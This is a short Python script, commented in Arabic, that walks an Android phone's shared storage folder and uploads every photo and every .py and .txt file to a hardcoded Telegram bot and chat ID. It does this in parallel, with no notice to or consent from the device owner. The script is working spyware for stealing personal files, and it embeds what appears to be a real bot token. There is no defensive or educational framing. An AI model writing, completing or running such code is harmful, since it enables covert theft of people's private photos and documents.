import os
import telebot
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# إعدادات البوت
TELEGRAM_BOT_TOKEN = "7217469306:AAGW7g_XKWvLwfp4F6cMlHaGEA-Sg4uagJw"
CHAT_ID = "5210419138"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# تحديد مسار المجلد
DIR_PATH = "/storage/emulated/0/"


# إرسال الصور عبر مكتبة telebot
def send_photo_telebot(file_path):
    with open(file_path, "rb") as f:
        bot.send_photo(chat_id=CHAT_ID, photo=f)

# إرسال الملفات عبر مكتبة requests
def send_document_requests(file_path):
    url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument'
    with open(file_path, 'rb') as f:
        files = {'document': f}
        data = {'chat_id': CHAT_ID}
        requests.post(url, data=data, files=files)

# معالجة الملفات في المجلد
def process_files():
    with ThreadPool(max_workers=10) as executor:
        for root, dirs, files in os.walk(DIR_PATH):
            for file in files:
                file_path = os.path.join(root, file)
                if file_path.lower().endswith(('.jpg', '.png', '.jpeg', '.webp')):
                    executor.submit(send_photo_telebot, file_path)
                elif file_path.lower().endswith(('.py', '.txt')):
                    executor.submit(send_document_requests, file_path)

# تنفيذ الدالة الرئيسية
if __name__ == "__main__":
    process_files()
